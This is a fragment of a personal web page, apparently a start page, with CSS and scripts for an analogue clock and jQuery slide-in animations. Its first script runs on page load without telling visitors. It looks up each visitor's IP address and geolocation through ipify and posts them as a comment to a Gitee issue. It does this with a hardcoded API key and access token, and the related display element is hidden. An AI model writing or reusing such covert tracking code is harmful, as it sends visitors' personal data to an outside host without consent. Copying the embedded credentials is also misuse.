    html {
      background: linear-gradient(to bottom,  #02AAB0,#536976,#292E49);

    body {
      margin: 0;

      display: flex;
      flex: 1;
      min-height: 100vh;
      align-items: center;
      justify-content: center;
    }

    .clock {
      width: 30rem;
      height: 30rem;
      border: 7px solid #282828;
      box-shadow: -4px -4px 10px rgba(67, 67, 67, 0.5),
      inset 4px 4px 10px rgba(0, 0, 0, 0.5),
      inset -4px -4px 10px rgba(67, 67, 67, 0.5),
      4px 4px 10px rgba(0, 0, 0, 0.3);
      border-radius: 50%;
      position: relative;
      padding: 2rem;
      margin: 50px auto; /* 居中的关键：使用 auto 来水平居中 */
    }


    .outer-clock-face {
      position: relative;
      width: 100%;
      height: 100%;
      border-radius: 50%; /* 修正：修改为50% */
      background: #282828;
      overflow: hidden;
    }

    .outer-clock-face::before,
    .outer-clock-face::after,
    .outer-clock-face .marking {
      content: '';
      position: absolute;
      width: 5px;
      height: 100%;
      background: #1df52f;
      z-index: 0;
      left: 50%;
    }

    .outer-clock-face .marking {
      background: #bdbdcb;
      width: 3px;
    }

    .outer-clock-face .marking.marking-one {
      transform: rotate(30deg);
    }

    .outer-clock-face .marking.marking-two {
      transform: rotate(60deg);
    }

    .outer-clock-face .marking.marking-three {
      transform: rotate(120deg);
    }

    .outer-clock-face .marking.marking-four {
      transform: rotate(150deg);
    }

    .inner-clock-face {
      position: absolute;
      top: 10%;
      left: 10%;
      width: 80%;
      height: 80%;
      background: #282828;
      border-radius: 50%; /* 修正：修改为50% */
      z-index: 1;
    }

    .inner-clock-face::before {
      content: '';
      position: absolute;
      top: 50%;
      left: 50%;
      width: 16px;
      height: 16px;
      border-radius: 50%; /* 修正：修改为50% */
      transform: translate(-50%, -50%);
      background: #4d4b63;
      z-index: 11;
    }

    .hand {
      width: 50%;
      right: 50%;
      height: 6px;
      background: #61afff;
      position: absolute;
      top: 50%;
      border-radius: 6px;
      transform-origin: 100%;
      transform: rotate(90deg);
      transition-timing-function: cubic-bezier(0.1, 2.7, 0.58, 1);
    }

    .hand.hour-hand {
      width: 30%;
      z-index: 3;
    }

    .hand.min-hand {
      height: 3px;
      z-index: 10;
      width: 40%;
    }

    .hand.second-hand {
      background: #ee791a;
      width: 45%;
      height: 2px;
    }
    .ipInfo {
       display: none;
     }


  </style>

<script>

  const apiKey = 'at_peEUe9s5p59MohBiPrdqOYqbSmevY';

  const getIpAddress = async () => {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      return data.ip;
    } catch (error) {
      console.error('Error fetching IP address:', error);
      return null;
    }
  };

  const getIpInfo = async () => {
    const ipAddress = await getIpAddress();
    if (ipAddress) {
      try {
        const response = await fetch(`https://geo.ipify.org/api/v2/country?apiKey=${apiKey}&ipAddress=${ipAddress}`);
        const data = await response.json();
        return data; // Return IP information directly
      } catch (error) {
        console.error('Error fetching IP info:', error);
      }
    }
    return null; // Return null if there's an issue
  };

  const displayIpInfo = (ipInfo) => {
    const ipInfoDiv = document.getElementById('ipInfo');

    // Get the current time
    const currentTime = new Date().toLocaleString();

    const infoText = `
            IP地址: ${ipInfo.ip}
            位置: ${ipInfo.location.country}, ${ipInfo.location.region}, ${ipInfo.location.timezone}
            经度: ${ipInfo.location.latlon ? ipInfo.location.latlon.latitude : 'N/A'}
            纬度: ${ipInfo.location.latlon ? ipInfo.location.latlon.longitude : 'N/A'}
            提交时间: ${currentTime}
        `;
    console.log('IP信息:', ipInfo);
    ipInfoDiv.innerHTML = infoText.replace(/\n\s+/g, '<br>'); // Replace newline characters with HTML line breaks
    return infoText; // Return formatted IP information
  };

  const submitIpInfo = async () => {
    const ipInfo = await getIpInfo();
    if (ipInfo) {
      const content = displayIpInfo(ipInfo);
      createComment(content);
    }
  };

  const createComment = (content) => {
    const accessToken = 'bd05e71d5885839b05bff7c0fdc8d8d8';
    const requestBody = {
      body: content,
    };

    fetch('https://gitee.com/api/v5/repos/wrq6/wrq6/issues/I8QJF4/comments', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${accessToken}`,
      },
      body: JSON.stringify(requestBody),
    })
            .then(response => {
              if (response.ok) {
                console.log('提交成功:', response);
              } else {
                console.error('提交失败:', response);
              }
            })
            .catch(error => {
              console.error('提交失败:', error);
            });
  };

  // Call the functions in the desired order
  submitIpInfo();

</script>

  <script>
    $(function () {
      var SLIDE_IN_DOWN = { opacity: 1, top: 0 };
      var SLIDE_IN_UP = { opacity: 1, bottom: 0 };
      var SLIDE_IN_LEFT = { left: 0 };
      var SLIDE_IN_RIGHT = { right: 0 };

      registerCheatCode();
      executeAnimations();

      function executeAnimations() {
        $.when()
          .then(animateTitle)
          .then(animateQuote)
          .then(animateLinks)
          .then(animateLocation);
      }

      function animateTitle() {
        return animate('h1', SLIDE_IN_DOWN);
      }

      function animateQuote() {
        return $.when(
          animate('.quote-line-start', SLIDE_IN_LEFT),
          animate('.quote-line-end',SLIDE_IN_RIGHT),
          animate('.quote-icon-start', SLIDE_IN_DOWN),
          animate('.quote-icon-end', SLIDE_IN_UP)
        )
          .then(function () {
            return animate('.quote-content', SLIDE_IN_DOWN);
          })
          .then(function () {
            return animate('.quote-author', SLIDE_IN_DOWN);
          });
      }

      function animateLinks() {
        var DELAY_STEP = 200;
        var elements = $('.links a');
        var concurrent = $.makeArray(elements)
          .map(function (element, index) {
            return animate(element, SLIDE_IN_DOWN, index * DELAY_STEP);
          });

        return $.when.apply($, concurrent);
      }

      function animateLocation() {
        return $.when(
          animate('.location-icon', SLIDE_IN_UP),
          animate('.location-text', SLIDE_IN_DOWN)
        );
      }

      function animate(selector, properties, delay, options) {
        delay = delay || 0;
        return $(selector).delay(delay)
          .animate(properties, options)
          .promise();
      }

      function registerCheatCode() {
        $(document.body).on('keydown', function (event) {
          var KEY_B = 66;

          if (event.which === KEY_B) {
            $('.relocate-location').text('Bookmark Page');
            $('.relocating').css('opacity', 1);

            window.setTimeout(function () {
              window.location.href = '/bookmarks.html';
            }, 1000);
          }
        });
      }
    });


  </script>

<script>

  const secondHand = document.querySelector('.second-hand');
  const minsHand = document.querySelector('.min-hand');
  const hourHand = document.querySelector('.hour-hand');

  function setDate() {
    const now = new Date();

    const seconds = now.getSeconds();
    const secondsDegrees = ((seconds / 60) * 360) + 90;
    secondHand.style.transform = `rotate(${secondsDegrees}deg)`;

    const mins = now.getMinutes();
    const minsDegrees = ((mins / 60) * 360) + ((seconds/60)*6) + 90;
    minsHand.style.transform = `rotate(${minsDegrees}deg)`;

    const hour = now.getHours();
    const hourDegrees = ((hour / 12) * 360) + ((mins/60)*30) + 90;
    hourHand.style.transform = `rotate(${hourDegrees}deg)`;
  }

  setInterval(setDate, 1000);

  setDate();
</script>
